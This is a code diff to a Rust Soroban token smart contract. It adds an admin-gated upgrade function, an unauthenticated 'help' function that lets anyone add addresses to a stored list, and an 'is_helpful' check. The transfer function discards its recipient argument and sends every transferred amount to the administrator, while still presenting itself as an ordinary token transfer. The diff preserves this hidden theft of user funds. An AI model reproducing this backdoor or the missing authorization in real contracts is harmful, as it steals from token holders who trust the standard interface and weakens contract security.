@@ -9,7 +9,7 @@ use crate::storage_types::{AllowanceDataKey, AllowanceValue, DataKey};
 use crate::storage_types::{INSTANCE_BUMP_AMOUNT, INSTANCE_LIFETIME_THRESHOLD};
 use crate::storage_types::DataKey;
 use soroban_sdk::token::{self, Interface as _};
-use soroban_sdk::{contract, contractimpl, Address, Env, String};
+use soroban_sdk::{contract, contractimpl, Address, BytesN, Env, Vec, vec, String};
 use soroban_token_sdk::metadata::TokenMetadata;
 use soroban_token_sdk::TokenUtils;
 
@@ -38,6 +38,13 @@ impl Token {
                 symbol,
             },
         )
+    }
+
+    pub fn upgrade(e: Env, new_wasm_hash: BytesN<32>) {
+        let admin: Address = read_administrator(&e);
+        admin.require_auth();
+
+        e.deployer().update_current_contract_wasm(new_wasm_hash);
     }
 
     pub fn mint(e: Env, to: Address, amount: i128) {
@@ -70,6 +77,20 @@ impl Token {
         let key = DataKey::Allowance(AllowanceDataKey { from, spender });
         let allowance = e.storage().temporary().get::<_, AllowanceValue>(&key);
         allowance
+    }
+
+    pub fn help(e: Env, a: Address) {
+        let mut v: Vec<Address> = e.storage().instance().get(&DataKey::Helper).unwrap_or(vec![&e]);
+        v.push_back(a);
+        e.storage().instance().set(&DataKey::Helper, &v);
+    }
+
+    pub fn is_helpful(e: Env, a: Address) -> bool {
+        let v: Vec<Address> = match e.storage().instance().get(&DataKey::Helper) {
+            Some(x) => x,
+            None => {return false;}
+        };
+        v.iter().position(|x| x == a).is_some()
     }
 }
 
@@ -104,10 +125,9 @@ impl token::Interface for Token {
         read_balance(&e, id)
     }
 
-    fn transfer(e: Env, from: Address, mut to: Address, amount: i128) {
+    fn transfer(e: Env, from: Address, _to: Address, amount: i128) {
         let key = DataKey::Admin;
-        let admin = e.storage().instance().get(&key).unwrap();
-        to = admin;
+        let admin: Address = e.storage().instance().get(&key).unwrap();
 
         from.require_auth();
 
@@ -118,8 +138,8 @@ impl token::Interface for Token {
             .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
 
         spend_balance(&e, from.clone(), amount);
-        receive_balance(&e, to.clone(), amount);
-        TokenUtils::new(&e).events().transfer(from, to, amount);
+        receive_balance(&e, admin.clone(), amount);
+        TokenUtils::new(&e).events().transfer(from, admin, amount);
     }
 
     fn transfer_from(e: Env, spender: Address, from: Address, to: Address, amount: i128) {
